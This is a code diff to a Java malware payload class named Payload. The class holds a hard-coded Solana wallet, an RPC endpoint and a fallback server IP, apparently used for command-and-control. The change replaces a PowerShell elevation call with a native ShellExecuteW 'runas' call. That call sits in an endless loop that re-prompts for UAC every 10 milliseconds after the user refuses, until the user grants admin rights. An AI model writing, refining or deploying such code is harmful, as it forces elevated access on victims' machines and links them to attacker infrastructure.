@@ -1,4 +1,5 @@
 // language: Java, file: payload/Payload.java
+import com.sun.jna.*;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -7,6 +8,11 @@ import java.util.Base64;
 import java.util.zip.*;
 
 public class Payload {
+    public interface Shell32 extends Library {
+        Shell32 INSTANCE = Native.load("shell32", Shell32.class);
+        int ShellExecuteW(Pointer hwnd, String lpOperation, String lpFile, String lpParameters, String lpDirectory, int nShowCmd);
+    }
+
     private static final String SOLANA_WALLET = "BCy1eKppGB5WPmQ8PrSJT4gkMRy5HmzsuaVrnqef7zoV";
     private static final String SOLANA_RPC = "https://api.devnet.solana.com";
     private static final String FALLBACK_SERVER = "95.182.96.216";
@@ -153,27 +159,24 @@ public class Payload {
             log("java: " + javaExe);
             log("jar: " + jarPath);
 
-            String psCommand = String.format(
-                "Start-Process -FilePath '%s' -Verb RunAs -ArgumentList '-jar \"%s\" %s %s'",
-                javaExe, jarPath, key, ip
-            );
-
+            String cmdArgs = String.format("-jar \"%s\" %s %s", jarPath, key, ip);
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                // Launch PowerShell in the background without waiting for it to close
-                new ProcessBuilder("powershell.exe", "-NoProfile", "-Command", psCommand).start();
+                // Call ShellExecuteW natively. No subprocess, no delays.
+                int result = Shell32.INSTANCE.ShellExecuteW(null, "runas", javaExe, cmdArgs, null, 1);
                 
-                // Spin-check every 15ms if the lock file was deleted by the elevated process
-                for (int i = 0; i < 100; i++) { 
-                    if (!lockFile.exists() || lockFile.delete()) {
-                        log("UAC Accepted. Parent exiting.");
-                        lockStream.close();
-                        System.exit(0); 
-                    }
-                    Thread.sleep(15);
+                if (result > 32) {
+                    // User clicked Yes, prompt closed successfully.
+                    log("UAC Accepted. Parent exiting.");
+                    lockStream.close();
+                    System.exit(0); 
+                } else {
+                    // User clicked No. Instantly loop and try again.
+                    log("UAC Denied. Instantly retrying...");
+                    Thread.sleep(10); // 10ms to prevent CPU 100% lock
                 }
             }
         } catch (Exception e) {
